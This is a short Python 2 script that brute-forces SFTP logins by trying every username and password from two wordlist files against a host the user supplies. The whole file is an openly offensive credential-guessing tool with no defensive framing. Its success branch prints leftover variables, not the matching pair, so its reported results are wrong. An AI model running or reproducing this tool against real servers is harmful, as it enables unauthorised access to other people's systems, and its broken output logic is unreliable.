#!/usr/bin/env python

#open source
import pysftp

def main():
	usr_list = raw_input("Enter the location of your username last: ")
	pas_list = raw_input("Enter the location of your password list: ")
	hostname = raw_input("Enter the hostname and include obscure port number: ")
	with open(usr_list, 'r') as usr:
		u_list = [_u.rstrip() for _u in usr]
	with open(pas_list, 'r') as password:
		p_list = [_p.rstrip() for _p in password]

	for user in u_list:
		for password in p_list:
			try:
				pysftp.Connection(hostname, username=user, password=password)
				print("Username: " + _u)
				print("Password: " + _p)
			except Exception:
				continue
	

if __name__ == '__main__':
    main()
